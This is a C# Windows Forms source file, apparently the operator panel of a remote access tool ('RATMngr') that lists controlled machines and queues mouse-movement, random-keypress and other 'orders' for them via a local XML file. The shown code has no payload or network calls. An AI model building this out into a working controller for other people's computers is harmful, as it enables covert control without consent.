using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Xml;

namespace RATMngr
{
    public partial class RatMngrForm : Form
    {
        private Timer updateTimer;
        private List<Order> orders = new List<Order>();
        private object fileLock = new object();
        private bool running = true;
        public RatMngrForm()
        {
            InitializeComponent();
            updateTimer = new Timer();
            updateTimer.Tick += UpdateTimer_Tick;
            updateTimer.Interval = 2400; //Update every 4th second
            updateTimer.Start();
            remBox.SelectionMode = SelectionMode.One;
        }

        private void UpdateTimer_Tick(object sender, EventArgs e)
        {
            try
            {
                lock (fileLock)
                {
                    int prevIndex = remBox.SelectedIndex;
                    XmlDocument xdoc = new XmlDocument();
                    xdoc.Load("rem.html");
                    var root = xdoc.DocumentElement.FirstChild;
                    remBox.Items.Clear();
                    orderBox.Items.Clear();
                    foreach (XmlNode remNode in root.ChildNodes)
                    {
                        remBox.Items.Add(new Remote(Guid.Parse(remNode.Attributes["uid"].Value), remNode.Attributes["friendly"].Value) {
                            KeyInterval = int.Parse(remNode.Attributes["keyInterval"].Value),
                            MouseIntensity = int.Parse(remNode.Attributes["mouseIntensity"].Value),
                            MoveMouse = remNode.Attributes["moveMouse"].Value == "true",
                            MouseInterval = int.Parse(remNode.Attributes["mouseInterval"].Value),
                            RandomKeys = remNode.Attributes["randomKeys"].Value == "true"                            
                        });
                        foreach (XmlNode order in remNode.ChildNodes)
                        {
                            orderBox.Items.Add(new Order(int.Parse(order.Attributes["oid"].Value), order.Attributes["type"].Value, order.Attributes["data"].Value));
                        }
                    }
                    remBox.SelectedIndex = prevIndex; 
                }
               
            }
            catch (Exception)
            {
                
            }
        }

        private void remBox_SelectedIndexChanged(object sender, EventArgs e)
        {
            if(remBox.SelectedIndex >= 0)
            {
                var rem = (Remote)remBox.SelectedItem;
                remMoveMouse.Checked = rem.MoveMouse;
                mouseIntensityUpDown.Value = rem.MouseIntensity;
                mouseIntervalUpDown.Value = rem.MouseInterval;
                remRandomKeys.Checked = rem.RandomKeys;
                keyIntervalUpDown.Value = rem.KeyInterval;
                friendlyBox.Text = rem.FriendlyName;
            }
        }

        private void saveBtn_Click(object sender, EventArgs e)
        {
            if(remBox.SelectedIndex >= 0)
            {
                var rem = (Remote)remBox.SelectedItem;
                rem.MoveMouse = remMoveMouse.Checked;
                rem.MouseIntensity = (int)mouseIntensityUpDown.Value;
                rem.MouseInterval = (int)mouseIntervalUpDown.Value;
                rem.RandomKeys = remRandomKeys.Checked;
                rem.KeyInterval = (int)keyIntervalUpDown.Value;
                rem.FriendlyName = friendlyBox.Text;

                lock (fileLock)
                {
                    XmlDocument xdoc = new XmlDocument();
                    xdoc.Load("rem.html");
                    var root = xdoc.DocumentElement.FirstChild;

                    foreach (XmlNode remNode in root.ChildNodes)
                    {
                        if (remNode.Attributes["uid"].Value == rem.ID.ToString())
                        {
                            remNode.Attributes["friendly"].Value = rem.FriendlyName;
                            remNode.Attributes["keyInterval"].Value = rem.KeyInterval.ToString();
                            remNode.Attributes["mouseIntensity"].Value = rem.MouseIntensity.ToString();
                            remNode.Attributes["moveMouse"].Value = rem.MoveMouse.ToString().ToLower();
                            remNode.Attributes["mouseInterval"].Value = rem.MouseInterval.ToString();
                            remNode.Attributes["randomKeys"].Value = rem.RandomKeys.ToString().ToLower();
                            break;
                        }
                    }
                    xdoc.Save("rem.html");
                }
            }
            
        }

        private void sendOrderBtn_Click(object sender, EventArgs e)
        {
            try
            {
                if (remBox.SelectedIndex >= 0)
                {
                    XmlDocument xdoc = new XmlDocument();
                    var rem = (Remote)remBox.SelectedItem;
                    lock (fileLock)
                    {
                        xdoc.Load("rem.html");
                        var root = xdoc.DocumentElement.FirstChild;
                        foreach (XmlNode remNode in root.ChildNodes)
                        {
                            if (remNode.Attributes["uid"].Value == rem.ID.ToString())
                            {
                                var order = new Order(Order.MaxId + 1, typeBox.SelectedItem.ToString(), dataBox.Text);
                                orderBox.Items.Add(order);
                                var node = xdoc.CreateElement("order");
                                node.SetAttribute("oid", order.ID.ToString());
                                node.SetAttribute("type", order.Type);
                                node.SetAttribute("data", order.Data);
                                remNode.AppendChild(node);
                                xdoc.Save("rem.html");
                                break;
                            }

                        } 
                    } 
                }
            }
            catch (Exception)
            {

            }
        }

        private void updateBtn_Click(object sender, EventArgs e)
        {
            if (running)
                updateTimer.Stop();
            else
                updateTimer.Start();
            running = !running;
            updateBtn.Text = running ? "Disable Update" : "Enable Update";
        }
    }
}
